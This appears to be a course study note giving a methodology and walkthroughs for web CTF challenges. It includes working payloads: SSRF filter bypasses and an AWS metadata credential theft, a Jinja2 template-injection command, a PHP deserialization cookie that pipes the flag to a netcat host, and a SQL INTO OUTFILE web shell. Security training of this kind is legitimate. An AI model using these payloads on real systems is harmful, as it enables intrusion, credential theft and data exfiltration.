---
tags: [ctf, practice, lab, vapt]
difficulty: intermediate
module: "60 - Advanced Chaining and Real-World Scenarios"
topic: "60.26 CTF Challenge Web"
---

# 60.26 CTF Challenge Walkthroughs: Web Category

## Introduction to Web CTF Challenges

Capture The Flag (CTF) competitions represent a critical training ground for modern penetration testers and security researchers. The Web category in CTFs specifically focuses on vulnerabilities inherent in web applications, RESTful APIs, GraphQL endpoints, and microservice architectures. While real-world penetration tests require comprehensive mapping of an entire attack surface to report all findings, CTF challenges are typically hyper-focused on identifying and chaining one or two specific, often obscure, vulnerability types designed to lead the attacker to a specific "flag" (a string of text proving exploitation).

Excelling in Web CTFs requires profound, encyclopedic knowledge of the HTTP protocol, browser security mechanisms (CORS, CSP, SOP), backend languages (PHP, Python, Node.js, Java, Go), database management systems (SQL and NoSQL), and modern deployment architectures (Docker, Kubernetes, AWS/GCP integrations). The attacker must understand how the application stack interprets data at every layer.

This document serves as an exhaustive methodology and deep-dive walkthrough guide for analyzing, deconstructing, and exploiting Web CTF challenges, mirroring techniques used in advanced real-world VAPT engagements.

## The Web CTF Methodology

Approaching a Web CTF challenge requires a rigorous, structured methodology. Haphazardly throwing payloads at input fields rarely yields success in modern challenges. The methodology is broken down into distinct, iterative phases:

1. **Extensive Reconnaissance and Information Gathering**
2. **Source Code Review (Whitebox) or Behavioral Analysis (Blackbox)**
3. **Vulnerability Identification and Hypothesis Generation**
4. **Exploit Construction and WAF/Filter Bypass**
5. **Exploitation, Chaining, and Privilege Escalation**
6. **Post-Exploitation and Flag Retrieval**

### Phase 1: Extensive Reconnaissance

The initial step is to understand the application's footprint, technology stack, and intended logic.

- **Endpoint and Directory Enumeration:** Tools like `ffuf`, `dirsearch`, and `gobuster` are essential. However, CTF authors often penalize aggressive fuzzing or hide endpoints behind specific HTTP headers.
  *Command example:* `ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://target.htb/FUZZ -mc 200,301,302,403`
- **Header Analysis & Tech Stack Fingerprinting:** Scrutinize HTTP response headers. A header like `X-Powered-By: Express` or `Server: Werkzeug/2.0.1 Python/3.9.5` immediately dictates the payload types to consider.
- **Client-Side Source Code and Asset Review:** Meticulously read HTML, CSS, and especially JavaScript. Source maps (`.js.map`) left in production can reveal original, unminified source code. Look for hidden comments, API keys, or hardcoded developmental endpoints.
- **State Management & Cookie Analysis:** Analyze how the application tracks state. Decode Base64 cookies, inspect JWTs (JSON Web Tokens) at `jwt.io` to see if the signature can be bypassed or brute-forced, and identify serialized objects (like PHP serialization strings).

### Phase 2: Source Code Review (Whitebox)

Many advanced web CTFs provide a `.zip` or `.tar.gz` archive of the application's source code. This shifts the engagement from black-box behavioral guessing to rigorous white-box source code auditing.

- **Mapping the Attack Surface:** Identify all application routes and API endpoints. Understand the MVC (Model-View-Controller) structure if one is used.
- **Tracing Input Sinks:** Track user-controlled input from the entry point (GET parameters, POST bodies, HTTP Headers, Cookies) to dangerous execution sinks. Dangerous sinks include `eval()`, `exec()`, `system()`, database query functions (without prepared statements), and template engine render functions.
- **Configuration and Environment Analysis:** Examine `docker-compose.yml`, `Dockerfile`, and framework configuration files (like `.env` or `config.php`). Look for hardcoded secret keys, outdated vulnerable base images, or debugging modes left enabled (e.g., `FLASK_DEBUG=1`).

## ASCII Diagram: Typical Web CTF Exploit Flow Architecture

```text
+-------------------+       1. Initial Recon       +-------------------+
|                   | ---------------------------> |                   |
|   CTF Player /    |                              |   Web App Target  |
|   Attacker        | <--------------------------- |   (Blackbox or    |
|   (Kali/Parrot)   |       HTTP Responses         |    Whitebox)      |
+-------------------+                              +-------------------+
        |                                                    |
        | 2. Code Review / Behavioral Analysis               |
        v                                                    v
+-------------------+                              +-------------------+
| Identify Sinks:   |                              | Tech Stack:       |
| - SQL Queries     |                              | - Backend: Node.js|
| - Template Eng.   |                              | - DB: PostgreSQL  |
| - Exec Functions  |                              | - Proxy: Nginx    |
+-------------------+                              +-------------------+
        |
        | 3. Vulnerability Hypothesis & Bypass Crafting
        v
+-------------------------------------------------------------+
| Exploitation Phase & Chaining:                              |
| [ ] Bypass WAF / Filters (Regex bypass, Unicode encoding)   |
| [ ] Trigger Vulnerability 1 (e.g., XSS to steal Admin Cookie|
| [ ] Trigger Vulnerability 2 (e.g., SSRF via Admin Panel)    |
| [ ] Escalate to RCE (e.g., SSRF to internal Redis/Gopher)   |
+-------------------------------------------------------------+
        |
        | 4. Exploit Delivery & Execution
        v
+-------------------+                              +-------------------+
|                   |      Crafted Payload         |                   |
|   Exploit Script  | ---------------------------> |   Target Server   |
|   (Python/Bash)   |                              |   Execution Env   |
|                   | <--------------------------- |                   |
+-------------------+      Flag Response           +-------------------+
```

## Deep Dive Walkthrough 1: Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) occurs when a web application fetches a remote resource without sufficiently validating the user-supplied URL. In CTFs, SSRF is the primary vector to pivot into internal, non-routable networks, bypass external firewalls, or interact with cloud metadata services.

### Scenario: The Internal PDF Generator
You are analyzing a web application that takes a user-supplied URL, renders the page using a headless browser (like Puppeteer), and returns a PDF. The application is hosted on AWS.

**Reconnaissance & Initial Testing:**
- The vulnerable endpoint is `/api/generate-pdf?url=http://example.com`.
- Attempting local file read via `url=file:///etc/passwd` is blocked by a regex filter checking the protocol.
- Attempting to access localhost via `url=http://localhost` or `url=http://127.0.0.1` is blocked by a blacklist filter.

**Bypassing the URL Filter / WAF:**
Modern WAFs use regex to block `localhost` or `127.0.0.1`. Attackers must utilize alternative representations of the loopback address.
- **Decimal Representation:** `http://2130706433`
- **Octal Representation:** `http://0177.0.0.1`
- **IPv6 Loopback:** `http://[::1]`
- **DNS Resolution / Wildcard DNS:** Services like `http://localtest.me` or `http://127.0.0.1.nip.io` resolve back to localhost.

**Exploitation via AWS Cloud Metadata:**
Since the server is hosted on AWS, it has access to the Instance Metadata Service (IMDS).
We supply the payload: `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
The returned PDF contains the name of the IAM role attached to the EC2 instance (e.g., `web-app-role`).
We then request: `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-role`
The resulting PDF contains the `AccessKeyId`, `SecretAccessKey`, and `Token`.

**Post-Exploitation:**
We configure the AWS CLI on our local machine using these stolen credentials.
`aws configure set aws_access_key_id <AccessKeyId>`
`aws configure set aws_secret_access_key <SecretAccessKey>`
`aws configure set aws_session_token <Token>`
We can now query the AWS environment, list S3 buckets, and locate the flag stored in an internal bucket: `aws s3 cp s3://secret-ctf-bucket/flag.txt .`

## Deep Dive Walkthrough 2: Server-Side Template Injection (SSTI)

SSTI vulnerabilities arise when developers unsafely concatenate user input directly into a server-side template (such as Jinja2, Twig, or Freemarker) instead of passing the input as template context variables.

### Scenario: The Flask Custom Profile
A Python Flask application allows users to set a custom "Bio" which is rendered on their profile page.

**Detection Phase:**
We input a mathematical expression within template delimiters: `{{ 7 * 7 }}`.
Upon viewing the profile, if the application renders `49`, we have confirmed the presence of Jinja2 SSTI.

**Exploitation Mechanics (Method Resolution Order):**
In Python, SSTI exploitation heavily relies on navigating the Method Resolution Order (MRO) to traverse from a known, benign object to a dangerous class, such as `subprocess.Popen` or the `os` module, enabling Remote Code Execution (RCE).

1. Start with an empty string class: `""`
2. Access its underlying class definition: `"".__class__`
3. Access the base object class (from which all Python classes inherit): `"".__class__.__mro__[1]`
4. Enumerate all subclasses derived from the base object: `"".__class__.__mro__[1].__subclasses__()`

**Payload Construction:**
We must locate a class within the `__subclasses__()` array that imports the `os` module or allows command execution. A common target is `<class 'os._wrap_close'>` or `<class 'subprocess.Popen'>`.
Assuming `<class 'os._wrap_close'>` is at index `128`, the payload to execute `cat /flag.txt` becomes:
```python
{{ "".__class__.__mro__[1].__subclasses__()[128].__init__.__globals__['popen']('cat /flag.txt').read() }}
```

**Bypassing Advanced Filters:**
CTF authors frequently implement Web Application Firewalls (WAFs) to filter keywords like `__class__`, `__mro__`, or `.`.
- **Bypassing the `.` (dot) filter:** Use the `attr()` filter in Jinja2.
  `{{ ""|attr("__class__")|attr("__mro__") }}`
- **Bypassing String/Keyword filters:** Pass the restricted strings via GET or POST parameters using the `request` object.
  `{{ request|attr(request.args.c)|attr(request.args.m)[1]... }}&c=__class__&m=__mro__`
- **Hex/Unicode Encoding:** Encode the strings within the payload to evade regex matching.

## Deep Dive Walkthrough 3: Insecure Deserialization (PHP Object Injection)

Deserialization vulnerabilities occur when an application instantiates objects from untrusted user input without proper validation. This is particularly devastating in PHP, Java, and Python (Pickle).

### Scenario: The Legacy PHP Session Manager
A PHP application tracks user sessions by storing a Base64-encoded serialized object in the `session` cookie.

**Source Code Analysis:**
The provided source code reveals a `Logger` class with a "magic method" `__destruct()`. Magic methods are automatically executed by PHP during specific object lifecycle events (e.g., when an object is destroyed).
```php
class Logger {
    public $logFile;
    public function __destruct() {
        // Danger: Deletes the file specified in $logFile
        unlink($this->logFile);
    }
}
```
Further inspection reveals a `CommandExecutor` class with a `__wakeup()` method, which triggers upon object deserialization.
```php
class CommandExecutor {
    public $cmd;
    public function __wakeup() {
        // Danger: Executes system commands
        system($this->cmd);
    }
}
```

**Exploitation Strategy:**
We intercept our legitimate session cookie and decode it: `O:4:"User":1:{s:4:"name";s:5:"admin";}`.
Our objective is to replace this `User` object with a malicious `CommandExecutor` object.
We write a short, local PHP script to generate the precise serialized payload:
```php
<?php
class CommandExecutor {
    public $cmd;
}
$exploit = new CommandExecutor();
$exploit->cmd = "cat /flag.txt | nc 10.0.0.5 4444"; // Exfiltrate flag via netcat
echo base64_encode(serialize($exploit));
?>
```
The script outputs: `TzoxNToiQ29tbWFuZEV4ZWN1dG9yIjoxOntzOjM6ImNtZCI7czozMzoiY2F0IC9mbGFnLnR4dCB8IG5jIDEwLjAuMC41IDQ0NDQiO30=`

We replace our browser's session cookie with this Base64 string. When the server receives our request, it calls `unserialize()`. The `CommandExecutor` object is instantiated, the `__wakeup()` magic method is automatically invoked, and our command executes, sending the flag to our listening netcat server.

## Advanced Concepts: XS-Leaks and Client-Side Attacks

While server-side attacks yield RCE, many CTFs focus on complex client-side attacks designed to steal information from an automated admin bot.
Cross-Site Leaks (XS-Leaks) involve using side-channel attacks (like timing attacks, frame counting, or cache probing) to infer sensitive information about a victim's session across different origins, bypassing the Same-Origin Policy (SOP).
For example, an attacker might load a target search endpoint in an `<iframe>` or `<img>` tag and measure the response time or check for `onload`/`onerror` events to determine if a specific search query (like "flag{A") returned results for the authenticated admin bot.

## Chaining Opportunities

- **XSS to SSRF via Headless Browsers:** In applications that generate PDFs from HTML (using Puppeteer or wkhtmltopdf), an attacker can inject Stored XSS. When the admin bot/PDF generator renders the page, the JavaScript executes. The JS can then perform local XHR requests (SSRF) to read local files like `file:///etc/passwd` or query cloud metadata, embedding the results directly into the generated PDF.
- **SQL Injection to LFI and Web Shell:** A seemingly simple SQL Injection can be escalated. Using `LOAD_FILE('/etc/passwd')`, an attacker achieves Local File Inclusion. More critically, using `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'`, the attacker writes a web shell to the server, escalating SQLi directly to Remote Code Execution.
- **Prototype Pollution to RCE (Node.js):** By abusing Prototype Pollution to modify the global `Object.prototype`, an attacker can inject arbitrary properties. If the application subsequently uses functions like `child_process.spawn()`, the attacker can pollute the `env` or `shell` options, hijacking the child process to execute arbitrary system commands.

## Related Notes
- [[01 - SQL Injection]]
- [[04 - Server-Side Request Forgery]]
- [[05 - Cross-Site Scripting]]
- [[09 - Insecure Deserialization]]
- [[12 - Server-Side Template Injection]]
- [[60.28 - HackTheBox Machine Walkthroughs Methodology]]
- [[60.30 - Building a Home Lab for VAPT Practice]]
